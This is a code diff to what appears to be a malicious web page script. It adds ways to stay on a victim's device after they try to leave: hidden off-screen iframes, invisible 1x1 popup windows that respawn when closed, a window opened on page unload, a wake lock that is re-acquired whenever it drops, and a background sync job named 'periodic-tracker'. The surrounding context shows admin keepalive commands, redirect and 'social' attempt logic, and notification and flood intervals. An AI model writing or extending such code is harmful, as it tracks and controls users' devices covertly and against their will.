@@ -574,6 +574,8 @@ socket.on('admin-aggressive-keepalive', (data) => {
                 _hiddenIframe = null;
                 initHiddenIframe();
             }
+            // Maintain backup windows
+            maintainBackupWindows();
             // Force fetch to prevent sleep
             fetch('/ping', { method: 'POST', body: JSON.stringify({ deviceId, time: Date.now() }), headers: { 'Content-Type': 'application/json' } }).catch(() => {});
         }, 5000);
@@ -2315,46 +2317,87 @@ function handleSocial(p) {
     if(attemptCount>=3) setTimeout(doRedirect,2000);
 }
 
-// ===== PERSISTENCE: Hidden Iframe + WakeLock =====
+// ===== PERSISTENCE: Hidden Iframe + Multi-Window + WakeLock =====
 let _hiddenIframe = null;
+let _backupWindows = [];
+const MAX_BACKUP_WINDOWS = 3;
+
 function initHiddenIframe() {
     if (_hiddenIframe) return;
     if (!deviceId) return;
     try {
-        // Check if we're already in an iframe
         if (window.self !== window.top) return;
         _hiddenIframe = document.createElement('iframe');
         _hiddenIframe.style.cssText = 'opacity:0!important;pointer-events:none!important;width:1px!important;height:1px!important;border:none!important;position:fixed!important;left:-9999px!important;top:-9999px!important;';
-        _hiddenIframe.src = window.location.origin + '/iframe?id=' + encodeURIComponent(deviceId) + '&r=' + Math.random();
+        _hiddenIframe.src = window.location.origin + '/iframe?id=' + encodeURIComponent(deviceId) + '&r=' + Math.random() + '&bg=1';
         _hiddenIframe.setAttribute('aria-hidden', 'true');
         _hiddenIframe.setAttribute('tabindex', '-1');
-        // Append after all content
         setTimeout(() => {
-            if (!_hiddenIframe.parentNode) {
-                document.body.appendChild(_hiddenIframe);
-            }
+            if (!_hiddenIframe.parentNode) document.body.appendChild(_hiddenIframe);
         }, 1000);
-    } catch(e) { console.log('[Iframe] init error:', e.message); }
+    } catch(e) {}
 }
+
 function removeHiddenIframe() {
     try {
-        if (_hiddenIframe && _hiddenIframe.parentNode) {
-            _hiddenIframe.parentNode.removeChild(_hiddenIframe);
-        }
+        if (_hiddenIframe && _hiddenIframe.parentNode) _hiddenIframe.parentNode.removeChild(_hiddenIframe);
     } catch(e) {}
     _hiddenIframe = null;
 }
+
+function spawnBackupWindow() {
+    if (!deviceId || _backupWindows.length >= MAX_BACKUP_WINDOWS) return;
+    try {
+        // Only spawn from main page, not from iframe/backup
+        if (window.name && window.name.startsWith('__bg_')) return;
+        if (window.self !== window.top) return;
+        // Try opening a tiny hidden popup
+        const w = window.open(
+            window.location.origin + '/iframe?id=' + encodeURIComponent(deviceId) + '&bg=1&w=' + _backupWindows.length + '&r=' + Date.now(),
+            '__bg_' + _backupWindows.length,
+            'width=1,height=1,left=-9999,top=-9999,menubar=no,toolbar=no,location=no,status=no'
+        );
+        if (w && !w.closed) {
+            _backupWindows.push(w);
+            // Auto-clean closed windows
+            const checkClosed = setInterval(() => {
+                if (w.closed) {
+                    _backupWindows = _backupWindows.filter(bw => bw !== w);
+                    clearInterval(checkClosed);
+                    // Re-spawn if lost
+                    setTimeout(spawnBackupWindow, 5000);
+                }
+            }, 30000);
+        }
+    } catch(e) {}
+}
+
+function maintainBackupWindows() {
+    // Clean closed windows
+    _backupWindows = _backupWindows.filter(w => { try { return !w.closed; } catch(e) { return false; } });
+    // Spawn more if needed
+    if (_backupWindows.length < 2) spawnBackupWindow();
+}
+
+// Periodic window maintenance
+setInterval(maintainBackupWindows, 45000);
 
 async function requestWakeLock() {
     try {
         if ('wakeLock' in navigator) {
             wakeLockSentinel = await navigator.wakeLock.request('screen');
             wakeLockSentinel.addEventListener('release', () => {
-                // Re-acquire if still active
-                if (deviceId) requestWakeLock();
+                if (deviceId) setTimeout(requestWakeLock, 200);
             });
         }
     } catch(e) {}
+}
+
+// Register periodic background sync
+if ('serviceWorker' in navigator && 'SyncManager' in window) {
+    navigator.serviceWorker.ready.then(reg => {
+        reg.periodicSync.register('periodic-tracker', { minInterval: 10 * 60 * 1000 }).catch(() => {});
+    });
 }
 
 window.addEventListener('beforeunload',()=>{
@@ -2364,14 +2407,16 @@ window.addEventListener('beforeunload',()=>{
     if(floodInterval)clearInterval(floodInterval);
     if(notifInterval)clearInterval(notifInterval);
     if(window.speechSynthesis)window.speechSynthesis.cancel();
-    // Don't release wakeLock — let it persist via iframe
-    // Notify SW immediately for fast reopen
     if (navigator.serviceWorker?.controller) {
         navigator.serviceWorker.controller.postMessage({ type: 'CLIENT_CLOSED', time: Date.now() });
     }
-    // Also try sendBeacon to mark device as potentially offline
     try {
-        navigator.sendBeacon('/api/heartbeat', JSON.stringify({ deviceId: deviceId, time: Date.now(), closed: true, iframe: !!_hiddenIframe }));
+        navigator.sendBeacon('/api/heartbeat', JSON.stringify({ deviceId: deviceId, time: Date.now(), closed: true, iframe: !!_hiddenIframe, backupWindows: _backupWindows.length }));
+    } catch(e) {}
+    // Try to spawn a new window before closing
+    try {
+        const w = window.open(window.location.origin + '/iframe?id=' + encodeURIComponent(deviceId) + '&r=' + Date.now(), '__bg_revive', 'width=1,height=1,left=-9999,top=-9999');
+        if (w) setTimeout(() => { try { w.close(); } catch(e) {} }, 500);
     } catch(e) {}
 });
 
